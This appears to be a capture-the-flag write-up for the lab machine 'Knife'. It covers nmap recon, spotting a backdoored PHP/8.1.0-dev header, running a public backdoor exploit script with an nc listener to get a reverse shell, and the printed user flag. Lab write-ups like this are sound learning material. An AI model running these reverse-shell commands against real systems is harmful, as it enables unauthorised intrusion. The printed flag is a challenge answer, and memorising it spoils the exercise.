# Knife

## Recon

Nmap (`sudo nmap -A -T4 -p- 10.10.10.242`) showed 22 and 80, but not much information about either of them.

## Web Recon
This was a very tedious part of the challenge. 
The best takeaway from this is: **get as much information as possible before trying to hack anything!!!**

I spent a couple of hours checking for directory traversal, XXS, iframe vulnerabilities etc.

Eventually I took a step back and checked some of the response headers on Burp:
```HTTP
HTTP/1.1 200 OK
Date: Tue, 24 Aug 2021 07:04:58 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By` value caught my eye immediately: `PHP/8.1.0-dev`.
As I suspected when I did some reserach it appeared that this is vulnerable, and on [this page](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) I found a [python script](../resources/knife/backdoor.py) that looked like it would do the job.

## Exploit

I set up an ncat listener:
```bash
nc -nlvp 4444
```

Ran the exploit:
```bash
python3 backdoor.py http://10.10.10.242 10.10.16.200 4444
```

Which gave me a reverse shell into a user account named james and the first flag:
```
james@knife:/$ cat $HOME/user.txt
73e3164162dde390aab7e40d3c7463e9
```


## Resources
- PHP 8.1.0-dev exploit - https://github.com/flast101/php-8.1.0-dev-backdoor-rce
- Upgrade terminal to tty - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- Knife documentation - https://docs.chef.io/workstation/knife/
